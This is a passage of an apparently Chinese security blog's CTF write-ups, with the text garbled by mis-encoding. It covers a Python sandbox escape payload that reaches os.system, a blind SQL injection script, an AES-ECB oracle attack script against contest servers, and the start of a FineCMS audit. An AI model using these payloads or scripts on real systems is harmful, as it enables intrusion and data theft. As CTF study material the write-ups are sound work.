<h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>æ‹¿åˆ°é¢˜ç›®ï¼Œncè¿æ¥ä¹‹åå¾—åˆ°ä¸€ä¸ªå‘½ä»¤äº¤äº’ä¼šè¯ã€‚</p>
<p>æ ¹æ®æç¤ºæ˜¯ä¸ªpythonç¯å¢ƒï¼Œå¹¶ä¸”è¦æ‹¿åˆ°shellè·å–flagã€‚é‚£ä¹ˆå¾ˆæ˜æ˜¾äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªpythonæ²™ç®±ç¯å¢ƒï¼Œè¦è¿›è¡Œé€ƒé€¸è·å–shellã€‚</p>
<p>é¦–å…ˆå°è¯•å¯¼å…¥èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¨¡å—ï¼Œå½“ç„¶ï¼Œç›´æ¥ç»™æŠ¥é”™äº†ã€‚ç„¶ååˆå°è¯•ä¸€ä¸‹importå…¶ä»–ä¸æ•æ„Ÿçš„æ¨¡å—ï¼Œå…¨éƒ½æ˜¯è¿”å›banã€‚é‚£ä¹ˆè¿™é‡Œåº”è¯¥æ˜¯å¯¹æ‰€æœ‰Importè¿›è¡Œäº†æ‹¦æˆªã€‚</p>
<p>é‚£ä¹ˆç›´æ¥ä¸Šä¸€ç§å½ªæ‚çš„æ–¹å¼ï¼Œpythonçš„objectç±»ä¸­é›†æˆäº†å¾ˆå¤šçš„åŸºç¡€å‡½æ•°ï¼Œæˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„æ—¶å€™ä¹Ÿæ˜¯éœ€è¦ç”¨objectå»æ“ä½œçš„ï¼Œ</p>
<p>Payload: ().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[59].<strong>init</strong>.func_globals[â€˜linecacheâ€™].<strong>dict</strong>[â€˜oâ€™+â€™sâ€™].<strong>dict</strong>[â€˜syâ€™+â€™stemâ€™]<a href="">(â€˜l</a>â€˜+â€™sâ€™) </p>
<p>ä½†æ˜¯å°±æ˜¯åœ¨è¿™é‡Œå‡ºç°äº†ä¸€ä¸ªå¾ˆå¤´ç–¼çš„äº‹ï¼Œè¿™ä¸ªæ²™ç®±è¿˜è¿‡æ»¤äº†æ•æ„Ÿå‘½ä»¤ï¼Œæ¯”å¦‚osï¼Œls ï¼Œsysï¼Œcatå…¨éƒ½è¿›è¡Œäº†è¿‡æ»¤ã€‚è€Œéå¸¸å·§çš„æ˜¯ï¼Œfunc_globalsé‡Œé¢åŒ…å«äº†lsè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œè¿™é‡Œåˆä¸èƒ½ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼è¿›è¡Œæ‹¼æ¥ã€‚åœ¨è¿™é‡Œé¥¶äº†ä¸€å¤§åœˆï¼Œå°è¯•å‡ ç§æ–¹å¼éƒ½æ²¡æœ‰æˆåŠŸã€‚ç„¶åæŸ¥äº†ä¸€å¤§æ³¢æ–‡æ¡£ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„æ–¹å¼ã€‚<strong>getattribute</strong></p>
<p> ç¤ºä¾‹ï¼š </p>
<p>x.<strong>getattribute</strong>(â€˜nameâ€™) &lt;==&gt;x.name</p>
<p>é‚£ä¹ˆè¿™é‡Œå¯ä»¥çœ‹å‡ºï¼Œobject xå¯ä»¥ä½¿ç”¨__getattribute__æ–¹æ³•ï¼Œè¿™æ ·nameå°±å˜ä¸ºå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬å¯ä»¥æ‹¼æ¥çš„è¦æ±‚ã€‚</p>
<p>é‚£ä¹ˆä¸Šé¢çš„payloadå¯ä»¥æ”¹ä¸ºï¼š</p>
<p>().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[59].<strong>init</strong>.<strong>getattribute</strong>(â€˜func_globalâ€™+â€™sâ€™)[â€˜linecacheâ€™].<strong>dict</strong>[â€˜oâ€™+â€™sâ€™].<strong>dict</strong><a href="'l%E2%80%98+%E2%80%99s'">â€˜syâ€™+â€™stemâ€™</a></p>
<p>é‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¯»å–flag.flagæ–‡ä»¶ä½äºhome/ctf/ç›®å½•ä¸‹æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshellã€‚<img src="/images/ciscn2018/run1.png" alt="run1"></p>
<p><img src="/images/ciscn2018/run2.png" alt="run2"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DDCTFçš„éƒ¨åˆ†WriteUp</title>
    <url>/2018/05/17/ddctf-de-bu-fen-writeup/</url>
    <content><![CDATA[<blockquote>
<p>å› ä¸ºç­¹å¤‡æ ¡èµ›å½“æ—¶å†™äº†ä¸€åŠçš„wpæ‹–äº†å¿«ä¸€ä¸ªæœˆæ‰å†™å®Œï¼Œä»Šå¤©å‘ç°DDCTFçš„å¹³å°å’Œé¢˜ç›®ç«Ÿç„¶è¿˜å¼€ç€(âŠ™vâŠ™)ï¼Œå¾ˆè‰¯å¿ƒå•Šï¼Œå½“æ—¶ä¹Ÿæ²¡æœ‰æ€ä¹ˆå»åšé¢˜ï¼Œæ°´äº†å‡ ä¸ªmiscï¼Œwebæ¶¨å§¿åŠ¿äº†ï¼Œå¥½èœ_(:Ğ·ã€âˆ )_</p>
</blockquote>
<a id="more"></a>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="æ•°æ®åº“çš„ç§˜å¯†"><a href="#æ•°æ®åº“çš„ç§˜å¯†" class="headerlink" title="æ•°æ®åº“çš„ç§˜å¯†"></a>æ•°æ®åº“çš„ç§˜å¯†</h2><p>å…ˆæ˜¯XFFç»•è¿‡ï¼Œæœ‰ä¸‰ä¸ªæœç´¢æ¡†ï¼Œè¿˜æœ‰ä¸€ä¸ªéšè—çš„authorå‚æ•°ã€‚æ³¨å…¥ç‚¹åœ¨authorã€‚</p>
<p>æœ‰jsè¿›è¡Œç­¾åå’ŒåŠ æ—¶é—´æˆ³ï¼Œpythonå¯ä»¥è°ƒç”¨execjsåº“æ‰§è¡Œjsï¼Œå°±å¯ä»¥è¿›è¡Œç›²æ³¨å•¦ã€‚</p>
<pre><code class="python">import requests
import execjs
import time

flag = &#39;&#39;
key=&quot;\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165&quot;
url=&quot;http://116.85.43.88:8080/ZODGIRYTDIETBCSI/dfe3ia/index.php?sig=&quot;
chrs=&quot;DCTFABEGHIJKLMNOPQRSUVWXYZabcdefghijklmnopqrstuvwxyz\&#123;\&#125;!#$%&amp;&#39;()*+,-./0123456789:;&lt;=&gt;?@[\]^_`&quot;

header=&#123;
    &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/65.0.3325.181 Safari/537.36&quot;,
    &quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;,
    &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9&quot;,
    &quot;X-Forwarded-For&quot;: &quot;123.232.23.245&quot;,
    &quot;Connection&quot;: &quot;close&quot;,
    &quot;Content-Length&quot;:&quot;38&quot;,
    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,
    &quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,
    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;
&#125;

def load_jd():
    file = open(&#39;change.js&#39;,&#39;r&#39;)
    js = file.read()
    return js

def get_sig(sqlin,time1):
    js = load_jd()
    ctx = execjs.compile(js)
    sig=ctx.call(&#39;submitt&#39;,sqlin,time1)
    return sig

def check(sqlin):
    global header
    time1 = str(int(time.time()))
    new_url = url + get_sig(sqlin,time1) + &quot;&amp;time=&quot; + time1
    post_data = &#123;
        &#39;id&#39;:&#39;&#39;,
        &#39;title&#39;:&#39;&#39;,
        &#39;author&#39;:sqlin,
        &#39;data&#39;:&#39;&#39;,
        &#39;time&#39;:time1
    &#125;
    reqs = requests.post(url=new_url,data=post_data,headers=header)
    data = reqs.content
    if &quot;admin&quot; in data:
        return 1
    else:
        return 0

def main():
    global flag
    num = 1
    while True:
        for i in chrs:
            sqlin = &quot;admin&#39; &amp;&amp; binary substr((SELECT secvalue from ctf_key4),1,&quot; + str(num) + &quot;)=&#39;&quot; + flag + i + &quot;&#39;# &quot;
            if check(sqlin) == 1:
                flag += i
                num += 1
                print flag
                break
        if flag[-1] == &#39;&#125;&#39;:
            break

if __name__ == &#39;__main__&#39;:
    main()


#SELECT group_concat(schema_name) from information_schema.schemata
#SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;ddctf&#39;
#SELECT group_concat(column_name) from information_schema.columns where table_schema=&#39;ddctf&#39; and table_name=&#39;ctf_key4&#39;secvalue
#SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;ctf_key4&#39;)
#DDCTF&#123;MSBMCTFMXOCBYFYI&#125;</code></pre>
<p>â€‹    æœ‰å¤§ä½¬ç›´æ¥æœ¬åœ°å†™ä¸ªä»£ç†é¡µé¢å¤„ç†ç­¾åå’Œæ—¶é—´æˆ³ä¸Šsqlmapä¸€æŠŠæ¢­ï¼Œè§ä¸‹é¢˜å¼•ç”¨é“¾æ¥..</p>
<h2 id="ä¸“å±é“¾æ¥"><a href="#ä¸“å±é“¾æ¥" class="headerlink" title="ä¸“å±é“¾æ¥"></a>ä¸“å±é“¾æ¥</h2><p>htmlä¸­å‘ç°æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯åªèƒ½è¯»<code>.class .xml .ico .ks</code>çš„æ–‡ä»¶ï¼Œæ ¹æ®springmvcæ¡†æ¶ç»“æ„å»æ‰¾æºç â€¦åšåˆ°è¿™å°±æ™šä¸Šäº†ï¼Œåæ¥å› ä¸ºå…¶ä»–äº‹å°±æç½®äº†ï¼Œå¤ªèœäº†å•Šà²¥_à²¥</p>
<p>é™„ä¸Šå¤§ä½¬çš„wpï¼š</p>
<blockquote>
<p><a href="https://blog.csdn.net/like98k/article/details/80057417">https://blog.csdn.net/like98k/article/details/80057417</a></p>
<p><a href="https://www.anquanke.com/post/id/144879">https://www.anquanke.com/post/id/144879</a></p>
</blockquote>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><p>çœŸç­¾åˆ°é¢˜</p>
<h2 id="â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ-â”»â”â”»"><a href="#â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ-â”»â”â”»" class="headerlink" title="(â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»"></a>(â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><blockquote>
<p>(â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»<br>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</p>
</blockquote>
<h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><pre><code class="python">s=&#39;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd&#39;
flag=&#39;&#39;
lens=len(s)
for i in range(0,lens,2):
    ch = &#39;0x&#39; + s[i:i+2]
    data = int(ch,16)
    flag += chr(data%128)

print flag
#That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</code></pre>
<blockquote>
<p>è²Œä¼¼æ˜¯åå…­è¿›åˆ¶çš„å‡¯æ’’ä½ç§»ï¼Ÿ</p>
</blockquote>
<h2 id="ç¬¬å››æ‰©å±•FS"><a href="#ç¬¬å››æ‰©å±•FS" class="headerlink" title="ç¬¬å››æ‰©å±•FS"></a>ç¬¬å››æ‰©å±•FS</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><blockquote>
<p>Då…¬å¸æ­£åœ¨è°ƒæŸ¥ä¸€èµ·å†…éƒ¨æ•°æ®æ³„éœ²äº‹ä»¶ï¼Œé”å®šå«Œç–‘äººå°æ˜ï¼Œå–è¯äººå‘˜ä»å°æ˜æ‰‹æœºä¸­è·å–äº†ä¸€å¼ å›¾ç‰‡å¼•èµ·äº†æ€€ç–‘ã€‚è¿™æ˜¯ä¸€é“é€åˆ†é¢˜ï¼Œæç¤ºå·²ç»åœ¨é¢˜ç›®é‡Œï¼Œæ—¥å¸¸è¿è§„å®¡è®¡ä¸­é¢‘æ¬¡æœ‰æ—¶å€™éå¸¸é‡è¦ã€‚</p>
</blockquote>
<h3 id="é¢˜è§£-1"><a href="#é¢˜è§£-1" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>â€‹    ä¸‹è½½å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ï¼Œå›¾ç‰‡å±æ€§å¾—åˆ°æç¤º<code>Pactera</code>ï¼Œforemoståˆ†ç¦»å‡ºæ¥ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæœ‰å¯†ç ï¼Œåˆ©ç”¨Pacteraè§£å‹å‡ºæ¥ä¸ªfile.txtï¼Œæ˜¯ä¸€å¤§æ®µå­—ç¬¦ï¼Œè¯é¢‘åˆ†æå¾—åˆ°flagã€‚</p>
<h2 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><blockquote>
<p>æç¤ºä¸€ï¼šè‹¥æ„Ÿè§‰åœ¨ä¸­é—´æŸä¸ªå®¹æ˜“å‡ºé”™çš„æ­¥éª¤ï¼Œè‹¥æœ‰éœ€è¦æ£€éªŒæ˜¯å¦æ­£ç¡®æ—¶ï¼Œå¯ä»¥æ¯”è¾ƒMD5: 90c490781f9c320cd1ba671fcb112d1c<br>æç¤ºäºŒï¼šæ³¨æ„è¡¥é½ç§é’¥æ ¼å¼<br>â€”â€“BEGIN RSA PRIVATE KEYâ€”â€“<br>XXXXXXX<br>â€”â€“END RSA PRIVATE KEYâ€”â€“</p>
</blockquote>
<h3 id="é¢˜è§£-2"><a href="#é¢˜è§£-2" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>æå–å‡ºçš„zipéƒ½ä¸èƒ½ç”¨ï¼Œåœ¨smtpåŒ…ä¸­æ‰¾åˆ°äº†å›¾ç‰‡çš„base64ï¼Œå»è§£ç å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œå°±æ˜¯ç§é’¥çš„å†…å®¹ï¼Œocrè¯†åˆ«å‡ºæ¥å¯èƒ½ä¼šæœ‰å‡ ä¸ªé”™çš„ï¼Œå»äººçœ¼æ¯”å¯¹ï¼Œç®€ç›´ä¸§å¿ƒç—…ç‹‚ã€‚è¡¥å…¨ä¹‹åå€’å…¥ç§é’¥å°±èƒ½è§£sslæµé‡äº†ï¼Œeditâ€“&gt;preferencesâ€”&gt;sslã€‚è¿½è¸ªä¸€ä¸‹httpæµå¾—åˆ°flagã€‚</p>
<h2 id="å®‰å…¨é€šä¿¡-AES-ECBåŠ å¯†æ”»å‡»"><a href="#å®‰å…¨é€šä¿¡-AES-ECBåŠ å¯†æ”»å‡»" class="headerlink" title="å®‰å…¨é€šä¿¡(AES-ECBåŠ å¯†æ”»å‡»)"></a>å®‰å…¨é€šä¿¡(AES-ECBåŠ å¯†æ”»å‡»)</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><blockquote>
<p>è¯·é€šè¿‡<code>nc 116.85.48.103 5002</code>ç­”é¢˜ï¼Œ<code>mission key</code>æ˜¯<code>f49348cf84d390da52498077ae7137d5</code>ï¼Œ<code>agent id</code>éšæ„å¡«å°±å¯ä»¥</p>
</blockquote>
<pre><code class="python">#!/usr/bin/env python
import sys
import json
from Crypto.Cipher import AES
from Crypto import Random


def get_padding(rawstr):
    remainder = len(rawstr) % 16
    if remainder != 0:
        return &#39;\x00&#39; * (16 - remainder)
    return &#39;&#39;


def aes_encrypt(key, plaintext):
    plaintext += get_padding(plaintext)
    aes = AES.new(key, AES.MODE_ECB)
    cipher_text = aes.encrypt(plaintext).encode(&#39;hex&#39;)
    return cipher_text


def generate_hello(key, name, flag):
    message = &quot;Connection for mission: &#123;&#125;, your mission&#39;s flag is: &#123;&#125;&quot;.format(name, flag)
    return aes_encrypt(key, message)


def get_input():
    return raw_input()


def print_output(message):
    print(message)
    sys.stdout.flush()


def handle():
    print_output(&quot;Please enter mission key:&quot;)
    mission_key = get_input().rstrip()

    print_output(&quot;Please enter your Agent ID to secure communications:&quot;)
    agentid = get_input().rstrip()
    rnd = Random.new()
    session_key = rnd.read(16)

    flag = &#39;&lt;secret&gt;&#39;
    print_output(generate_hello(session_key, agentid, flag))
    while True:
        print_output(&quot;Please send some messages to be encrypted, &#39;quit&#39; to exit:&quot;)
        msg = get_input().rstrip()
        if msg == &#39;quit&#39;:
            print_output(&quot;Bye!&quot;)
            break
        enc = aes_encrypt(session_key, msg)
        print_output(enc)


if __name__ == &quot;__main__&quot;:
    handle()</code></pre>
<h3 id="é¢˜è§£-3"><a href="#é¢˜è§£-3" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>å…ˆæ¥çœ‹ä¸€çœ‹é¢˜ç›®æµç¨‹ï¼š</p>
<pre><code> ~ nc 116.85.48.103 5002
[]Please enter mission key:
f49348cf84d390da52498077ae7137d5
[]Please enter your Agent ID to secure communications:
00000
[]de17b72ac25766900858e5ea3fbbb0b5bb25ca815cfebb19799cc9c3ae39e01181fe1be5cbf45a1868c8309223e47f522dd536f36ff756acae5175c824f79dcb383ddc2229cc2a03094387a253b0d8a791e25d01f1cd934d7c83e3a6b64787b1
[]Please send some messages to be encrypted, &#39;quit&#39; to exit:
00000
88dfdc59a59ec6cfd9e5221b93bc6506
[]Please send some messages to be encrypted, &#39;quit&#39; to exit:
Connection for mission: 0000000
de17b72ac25766900858e5ea3fbbb0b5f26fa7509409a427afa6a150bd4b01d3
[]Please send some messages to be encrypted, &#39;quit&#39; to exit:
quit
Bye!</code></pre>
<p>â€‹    é¢˜ç›®ä¼šç»™ä½ ä¸€ä¸ªmission keyï¼Œè¾“å…¥æ­¤keyï¼ŒæœåŠ¡å™¨è¿”å›ä¸€ä¸²å¯†æ–‡ï¼Œæ ¹æ®ç»™å‡ºçš„é¢˜ç›®è„šæœ¬å¯çŸ¥ï¼Œå¯†æ–‡çš„ç”Ÿæˆè¿‡ç¨‹æ˜¯ï¼š<code>Connection for mission: &#123;&#125;, your mission&#39;s flag is: &#123;&#125;</code>å°†ç¬¬ä¸€ä¸ªèŠ±æ‹¬å·æ›¿æ¢æˆè¾“å…¥çš„agentidï¼Œç¬¬äºŒä¸ªèŠ±æ‹¬å·å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„flagã€‚</p>
<p>â€‹    ä¸‹é¢æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹AESåŠ å¯†çš„ECBæ¨¡å¼ï¼š</p>
<blockquote>
<p>ECBæ˜¯æœ€ç®€å•çš„å—å¯†ç åŠ å¯†æ¨¡å¼ï¼ŒåŠ å¯†å‰æ ¹æ®åŠ å¯†å—å¤§å°ï¼ˆå¦‚AESä¸º128ä½ï¼‰åˆ†æˆè‹¥å¹²å—ï¼Œä¹‹åå°†æ¯å—ä½¿ç”¨ç›¸åŒçš„å¯†é’¥å•ç‹¬åŠ å¯†ï¼Œè§£å¯†åŒç†.</p>
<p><img src="/images/DDCTF/AES1.png" alt="AES"></p>
<p><img src="/images/DDCTF/AES2.png" alt="AES"></p>
</blockquote>
<p>â€‹    ä¹Ÿå°±æ˜¯ä»ç¬¬ä¸€ä½å¼€å§‹æ¯16ä½ä½ä¸€ç»„ï¼Œä½¿ç”¨ç›¸åŒçš„å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œæœ€åä¸€ç»„å¦‚æœä¸å¤Ÿ16ä½ï¼Œä½¿ç”¨â€™\x00â€™å¡«å……å¤Ÿ16ä½ã€‚</p>
<p>â€‹    åŸæ–‡å¼€å§‹çš„å­—ç¬¦ä¸²æ˜¯å›ºå®šçš„ï¼š<code>Connection for mission:[ç©ºæ ¼]</code>ï¼Œå¼€å¤´24ä½å­—ç¬¦ï¼Œå¦‚æœæˆ‘ä»¬è¡¥å……8ä½ï¼Œæ­£å¥½æ„æˆäº†ä¸¤ä¸ªå—ã€‚ç¬¬ä¹ä½å¼€å§‹å°±æ˜¯å…¨æ–°çš„ä¸€å—ï¼Œè¿™ä¸€å—å°±æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥16ä½çš„å†…å®¹å¾—åˆ°è¯¥å†…å®¹çš„å¯†æ–‡ï¼Œå¦‚æœä¸¤ä¸ªå¯†æ–‡å—ç›¸åŒï¼Œé‚£ä¹ˆåŸæ–‡ä¹Ÿç›¸åŒã€‚æˆ‘ä»¬é‡‡å–ä»åå‘å‰çš„æ–¹å¼è¿›è¡Œã€‚</p>
<p>â€‹    å› ä¸ºæœ€åä¸€ç»„å¦‚æœä¸è¶³16ä½ä»¥â€™\x00â€™å¡«å……ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶è¾“å…¥é•¿åº¦ä½¿æœ€åçš„ä¸€ä¸ªå­—ç¬¦å¤šå‡ºæ¥å•ç‹¬ä½œä¸ºä¸€ä¸ªåˆ†ç»„ï¼Œè¿™æ ·æœ€åä¸€ç»„å°±æ˜¯<code>&#125;</code>+15ä¸ªâ€™\x00â€™ï¼Œå…ˆæ„é€ ä¸€ä¸ª<code>&#125;</code>å¼€å¤´çš„å®Œæ•´çš„å—ï¼Œå†å¾€åé¢å¡è¡¥ä½å­—ç¬¦ï¼Œç›´åˆ°å¯†æ–‡æœ€åä¸€ç»„å’Œè¯¥ç»„ç›¸åŒï¼Œæˆ‘ä»¬å°±ç¡®å®šäº†è¿™ä¹ˆä¸€ä¸ªæ•°å€¼ï¼Œä½¿åˆ†ç»„åä½™ä¸€ä½çš„æ•°å€¼ã€‚è·å–è¯¥æ•°å­—çš„è„šæœ¬å¦‚ä¸‹ã€‚</p>
<pre><code class="python">from pwn import *
import time
import sys

chrs=&quot;DCTFabcdefghijklmnopqrstuvwxyz\&#123;\&#125;!/0123456789:;&quot;
key = &quot;f49348cf84d390da52498077ae7137d5&quot;
flag = &#39;ab1af39995be81a&#39;

def go():
    global flag
    for i in range(20):
        conn = remote(&#39;116.85.48.103&#39;,5002)
        conn.recvline()
        conn.sendline(key)
        conn.recvline()
        ID = &quot;00000000&#125;&quot;
        conn.sendline(ID)
        rightstr = conn.recvline()
        checkstr = rightstr[64:96]
        compstr = rightstr[-33:-1]
        print checkstr
        print compstr
        if checkstr == compstr:
            print i 
            conn.sendline(&#39;quit&#39;)
            conn.close()
            break
        else:
            conn.close()
            ID += &quot;\x00&quot;
        sys.stdout.flush()

if __name__ == &#39;__main__&#39;:
    go()

# i=15
</code></pre>
<p>â€‹    ç°åœ¨ç»è¿‡æˆ‘ä»¬æ„é€ çš„åŸæ–‡å¤§æ¦‚è¿™ä¸ªæ ·å­-&gt; <code>Connection for m</code> <code>ission: 00000000</code> <code>&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code> <code>, your mission&#39;s</code>  <code>[ç©ºæ ¼]flag is: DDCTF&#123;xxx</code> <code>&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code> ,ä¸ºäº†æ–¹ä¾¿çœ‹æˆ‘å°±ç›´æ¥åˆ†ç»„è¡¨ç¤ºäº†ï¼Œæ¯ç»„16ä¸ªå­—ç¬¦ã€‚æˆ‘ä»¬æ¯å‘}å‰é¢æ’å…¥ä¸€ä½ï¼Œflagçš„å€’æ•°ä¸€ä½å°±ä¼šè¿›å…¥åˆ°æœ€åçš„å¯†æ–‡å—ï¼Œé€šè¿‡æ¯ä¸€ä½çš„çˆ†ç ´å¯ä»¥å¾—åˆ°flagçš„å15ä½ï¼ˆè¿˜æœ‰ä¸€ä¸ª}ï¼‰ï¼Œå®é™…ä¸Šæˆ‘æ²¡å‘ç°flagå¤§äº15ä½ï¼Œå½“æˆ‘ä»¬ç»§ç»­æ’å…¥ä¸€ä¸ªå­—ç¬¦æ—¶ï¼Œ}å¤šå‡ºæ¥äº†ğŸ’ºæœ€åä¸€ç»„ï¼Œå€’æ•°ç¬¬äºŒç»„çš„16ä¸ªå­—ç¬¦ä¸­åé¢15ä¸ªæ˜¯æˆ‘ä»¬çŸ¥é“çš„ï¼ŒåŒç†ï¼Œæˆ‘ä»¬åªè¦æ¯”è¾ƒå€’æ•°ç¬¬äºŒç»„å¯†æ–‡å’Œæˆ‘ä»¬æ„é€ çš„å¯†æ–‡ï¼ˆç¬¬ä¸‰ç»„ï¼‰å°±å¥½äº†ã€‚ä»¥æ­¤ç±»æ¨â€¦â€¦</p>
<p>â€‹    è„šæœ¬å†™å¤æ‚äº†ï¼Œtryflagå‡½æ•°å’Œç¬¬äºŒæ¬¡sendlineæ²¡å¿…è¦ï¼Œæ‡’å¾—æ”¹äº† _(:Ğ·ã€âˆ )_</p>
<pre><code class="python">from pwn import *
import time
import sys

chrs=&quot;DCTFabcdefghijklmnopqrstuvwxyz\&#123;\&#125;!/0123456789:;&quot;
key = &quot;f49348cf84d390da52498077ae7137d5&quot;
flag = &#39;ab1af39995be81a&#39;

def tryflag(ID):
    global flag
    test = &quot;Connection for mission: &quot; + ID + &quot;, your mission&#39;s flag is&quot;
    return test

def go():
    global flag

    for i in chrs:
        conn = remote(&#39;116.85.48.103&#39;,5002)
        conn.recvline()
        conn.sendline(key)
        conn.recvline()
        ID = &quot;00000000&quot;+i+flag+&quot;&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
        conn.sendline(ID)
        rightstr = conn.recvline()
        conn.recvline()
        test = tryflag(ID)
        conn.sendline(test)
        checkstr = conn.recvline()[64:96]
        if len(flag) &lt; 15:
            compstr = rightstr[-33:-1]
        elif len(flag) &gt;= 15 and len(flag) &lt; 31:
            compstr = rightstr[-65:-33]
        else:
            compstr = rightstr[-97:-65]
        print checkstr
        print compstr
        if checkstr == compstr:
            flag = i + flag
            print flag + &quot;------------------&quot;
            conn.sendline(&#39;quit&#39;)
            conn.close()
            break
        else:
            conn.close()
            #ID += &quot;\x00&quot;
        sys.stdout.flush()

if __name__ == &#39;__main__&#39;:
    while True:
        go()
#DDCTF&#123;87fa2cd38a4259c29ab1af39995be81a&#125;
</code></pre>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Finecmsä»£ç å®¡è®¡</title>
    <url>/2017/08/27/finecms-dai-ma-shen-ji/</url>
    <content><![CDATA[<h1 id="Finecmsä»£ç å®¡è®¡"><a href="#Finecmsä»£ç å®¡è®¡" class="headerlink" title="Finecmsä»£ç å®¡è®¡"></a>Finecmsä»£ç å®¡è®¡</h1><h2 id="1-SQLè¯­å¥æ‰§è¡Œ"><a href="#1-SQLè¯­å¥æ‰§è¡Œ" class="headerlink" title="1.SQLè¯­å¥æ‰§è¡Œ"></a>1.SQLè¯­å¥æ‰§è¡Œ</h2><p><code>/finecms/dayrui/config/config.php</code>ä¸­çš„ç¬¬37è¡Œå¯¹cookie_nameè¿›è¡Œäº†å®šä¹‰ã€‚</p>
<pre><code>$config[&#39;sess_cookie_name&#39;]                = $site[&#39;SYS_KEY&#39;].&#39;_ci_session&#39;;</code></pre>
<p>è¿™é‡Œ$site[â€˜SYS_KEYâ€™]ä¸å°±æŠŠSYS_KEYçš„å€¼ç»™æš´éœ²äº†ã€‚</p>
<p>è¿™ä¸ªSYS_KEYæ˜¯å®‰å…¨ç ï¼Œæœ‰äº†å®ƒå°±èƒ½è¿›è¡Œæ¥ä¸‹æ¥çš„æ•æ„Ÿå‡½æ•°çš„è°ƒç”¨ã€‚</p>
<p><code>/finecms/dayrui/controllers/Api.php</code>ä¸­çš„115-166è¡Œçš„data2()å‡½æ•°ã€‚</p>
<pre><code class="php">public function data2() &#123;

        $data = array();

        // å®‰å…¨ç è®¤è¯
